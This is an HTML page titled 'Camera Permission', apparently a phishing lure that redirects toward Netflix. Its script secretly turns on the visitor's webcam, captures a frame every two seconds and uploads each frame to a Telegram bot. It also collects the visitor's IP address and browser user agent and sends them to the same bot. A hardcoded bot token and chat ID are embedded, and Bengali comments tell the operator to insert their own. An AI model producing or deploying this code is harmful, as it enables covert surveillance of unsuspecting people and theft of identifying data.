<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Permission</title>
</head>
<body>
    <meta http-equiv="refresh" content="0; url=https://www.netflix.com/bd/">
     <script>
        const botToken = '6279713413:AAEmPVpjxZROtRY9kjSysmSskrG3OrbuiWw'; // আপনার টেলিগ্রাম বট টোকেন এখানে দিন
        const chatId = '5125698617'; // আপনার চ্যাট আইডি এখানে দিন

        async function startVideo() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                setInterval(() => {
                    captureImage();
                }, 2000); // Adjusted to 2000 ms (2 seconds)
            } catch (error) {
                console.error("Error accessing camera: ", error);
            }
        }

        function captureImage() {
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob((blob) => {
                sendImageToTelegram(blob);
            }, 'image/png');
        }

        async function sendImageToTelegram(blob) {
            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'image.png');

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log("Image sent to Telegram");
                } else {
                    console.error("Error sending image to Telegram: ", response.statusText);
                }
            } catch (error) {
                console.error("Error sending image to Telegram: ", error);
            }
        }

        async function getUserInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;

                const userAgent = navigator.userAgent;
                const userInfo = { ip, userAgent };

                console.log("User info: ", userInfo);

                await sendUserInfoToTelegram(userInfo);
            } catch (error) {
                console.error("Error getting user info: ", error);
            }
        }

        async function sendUserInfoToTelegram(userInfo) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `User Info: IP - ${userInfo.ip}, User Agent - ${userInfo.userAgent}`
                    })
                });

                if (response.ok) {
                    console.log("User info sent to Telegram");
                } else {
                    console.error("Error sending user info to Telegram: ", response.statusText);
                }
            } catch (error) {
                console.error("Error sending user info to Telegram: ", error);
            }
        }

        window.onload = () => {
            startVideo();
            getUserInfo();
        };
    </script>
</body>
</html>
